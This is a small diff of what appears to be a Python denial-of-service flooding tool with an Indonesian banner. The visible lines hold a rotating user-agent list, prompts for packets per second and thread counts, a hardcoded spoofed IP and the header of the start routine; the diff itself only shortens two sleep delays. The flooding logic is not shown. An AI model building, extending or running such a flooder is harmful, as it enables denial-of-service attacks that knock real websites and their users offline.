@@ -34,7 +34,7 @@ print("""\033[93m
   URL SKAN IP DARI YANG ANDA INGIN
 """)
 print ()
-time.sleep(3)
+time.sleep(2)
 
 useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
 "Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
@@ -75,7 +75,7 @@ pack = int(input(" \033[94m[+] INPUT PACKET/s \033[1;31;40m  ==> : \033[0m"))
 threads = int(input(" \033[94m[+] INPUT THREADS \033[1;31;40m  ==> : \033[0m"))
 fake_ip = '182.21.20.32'
 print("""\033[93m""")
-time.sleep(3)
+time.sleep(2)
 os.system("clear")
 def start():
     global useragents, ref, acceptall
